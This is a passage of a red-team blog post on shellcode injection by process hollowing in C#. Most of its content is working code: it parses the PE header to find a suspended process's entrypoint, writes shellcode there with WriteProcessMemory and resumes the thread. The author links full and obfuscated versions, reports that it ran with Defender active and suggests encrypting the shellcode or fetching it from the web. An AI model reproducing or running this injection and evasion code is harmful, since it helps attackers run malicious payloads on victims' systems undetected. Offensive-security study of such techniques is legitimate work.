</pre></table></code></div></div><p>Then we can calculate the <code class="language-plaintext highlighter-rouge">e_lfanew</code> value which contains the PE Header at the offset of <code class="language-plaintext highlighter-rouge">0x3c</code>. The value of <code class="language-plaintext highlighter-rouge">e_lfanew</code> is 4 bytes so we will be using <code class="language-plaintext highlighter-rouge">ToUint32</code>.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kt">uint</span> <span class="n">e_lfanew</span> <span class="p">=</span> <span class="n">BitConverter</span><span class="p">.</span><span class="nf">ToUInt32</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="m">0x3C</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] e_lfanew: 0x{0}"</span><span class="p">,</span> <span class="n">e_lfanew</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="s">"X"</span><span class="p">));</span>
</pre></table></code></div></div><p>We can get the RVA offset by adding <code class="language-plaintext highlighter-rouge">0x28</code> into the <code class="language-plaintext highlighter-rouge">e_lfanew</code> value that we have which contains PE Header pointer.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">uint</span> <span class="n">rvaOffset</span> <span class="p">=</span> <span class="n">e_lfanew</span> <span class="p">+</span> <span class="m">0x28</span><span class="p">;</span>
</pre></table></code></div></div><p>We are going to read 4 bytes into the RVA offset to get the offset of the executable entrypoint address</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">uint</span> <span class="n">rva</span> <span class="p">=</span> <span class="n">BitConverter</span><span class="p">.</span><span class="nf">ToUInt32</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">rvaOffset</span><span class="p">);</span>
</pre></table></code></div></div><p>Finally we can add RVA and the base address to get the absolute value of the Entrypoint Address that we can write our shellcode to.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">entrypointAddr</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)((</span><span class="n">UInt64</span><span class="p">)</span><span class="n">execAddr</span> <span class="p">+</span> <span class="n">rva</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Entrypoint Found: 0x{0}"</span><span class="p">,</span> <span class="n">entrypointAddr</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="s">"X"</span><span class="p">));</span>
</pre></table></code></div></div><p>Now that we have the address we need we can write our shellcode in it using <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>. We are going to give it the process handle, the entrypoint address we want to write to, the <code class="language-plaintext highlighter-rouge">buf</code> which contains the shellcode which we are writing, and the length.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">lpNumberOfBytesWritten</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
<span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">entrypointAddr</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">ref</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>
</pre></table></code></div></div><p>Once that is done we can resume the thread that we had suspended at the start using <code class="language-plaintext highlighter-rouge">ResumeThread</code>. We need to give it a thread handle which we can again retrive from the <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code> struct.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">threadHandle</span> <span class="p">=</span> <span class="n">proc_info</span><span class="p">.</span><span class="n">hThread</span><span class="p">;</span>
<span class="nf">ResumeThread</span><span class="p">(</span><span class="n">threadHandle</span><span class="p">);</span>
</pre></table></code></div></div><p>If everything went well you should have execution of your shellcode. If not look at your code again or you can always contact me and I’ll be happy to help. <img data-src="/assets/img/shellcode-injections-2/pop.png" alt="Shellcode Popping" data-proofer-ignore></p></ul><h2 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You can find the code at my github <a href="https://github.com/crypt0ace/ProcessHollow/blob/main/Program.cs">here</a>. I have some other functionalities like sleep, courtesy of <a href="https://twitter.com/snovvcrash">Snovvcrash</a> whose code is <a href="https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/process-hollowing">here</a>. Also made the code look a bit less shitty. There is also a obfucated version present <a href="https://github.com/crypt0ace/ProcessHollow/tree/main/Obfuscated%20Version">here</a> which was obfuscated using <a href="https://github.com/Flangvik/RosFuscator">Rosfuscator</a> by <a href="https://twitter.com/flangvik">Melvin Langvik</a>. Works pretty well. I aslo have a powershell script that pulls the executable from the web if not touching disk is your thing. Pretty basic for now. Will be making it like <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack</a> soon.</p><h2 id="conclusion"><span class="mr-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let me know if you need help or whatever. My socials are at the bottom left. If there’s any mistakes or something I missed please reach out. This is basic but still executed my shellcode with Defender active. But you can always built upto it with encrypted shellcodes, or not having shellcode at all and fetching it from the web etc. Ill leave that to the reader. If some things might sound new to you I do recommend reading the PE Structure which would help you understand the terms like <code class="language-plaintext highlighter-rouge">e_lfanew</code>.</p><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>All credits to these amazing posts and code which I constantly found myself reading.</p><ul><li><a href="https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/process-hollowing">Snovvcrash Process Hollowing</a><li><a href="https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs">Cas Van Cooten Process Hollowing</a><li><a href="https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75">Michael Gorelik</a><li><a href="https://gist.github.com/affix/994d7b806a6eaa605533f46e5c27fa5e">ProcessHollow</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/red-team/" class="post-tag no-text-decoration" >Red Team</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Shellcode+Injection+in+C%23+-+Part+2+-+Process+Hollowing+-+Crypt0ace&url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FShellcode-Injection-Techniques-Part-2%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Shellcode+Injection+in+C%23+-+Part+2+-+Process+Hollowing+-+Crypt0ace&u=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FShellcode-Injection-Techniques-Part-2%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FShellcode-Injection-Techniques-Part-2%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/NHA-Part-3/">AD Pwnage: Ninja Hackers Academy Part 3</a><li><a href="/posts/NHA-Part-2/">AD Pwnage: Ninja Hackers Academy Part 2</a><li><a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/">Using D/Invoke for Offensive Tool Development in C#</a><li><a href="/posts/Staying-under-the-Radar-Part-2/">Staying Under the Radar - Part 2 - Hiding IAT using Delegates</a><li><a href="/posts/Shellcode-Injection-Techniques/">Shellcode Injection in C# - Part 1 - Process Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-3/"><div class="card-body"> <em class="small" data-ts="1663268400" data-df="ll" > Sep 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</h3><div class="text-muted small"><p> Introduction In this post we are going to look at another method for shellcode execution. THis involves using the API call QueueUserAPC. Like previous Process Hollowing, in this we are going to ope...</p></div></div></a></div><div class="card"> <a href="/posts/Staying-under-the-Radar/"><div class="card-body"> <em class="small" data-ts="1663441200" data-df="ll" > Sep 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs</h3><div class="text-muted small"><p> Introduction In this post we are going to look at two “features” (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microso...</p></div></div></a></div><div class="card"> <a href="/posts/Staying-under-the-Radar-Part-2/"><div class="card-body"> <em class="small" data-ts="1663614000" data-df="ll" > Sep 20, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Staying Under the Radar - Part 2 - Hiding IAT using Delegates</h3><div class="text-muted small"><p> Introduction In this post we are going to loo kat another technique we can use in C# that can help us keep our imports hidden and the Import Address Table (IAT) clean. This is done by the use of de...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Shellcode-Injection-Techniques/" class="btn btn-outline-primary" prompt="Older"><p>Shellcode Injection in C# - Part 1 - Process Injection</p></a> <a href="/posts/Shellcode-Injection-Techniques-Part-3/" class="btn btn-outline-primary" prompt="Newer"><p>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/crypt0acee">Ahmed Sher</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
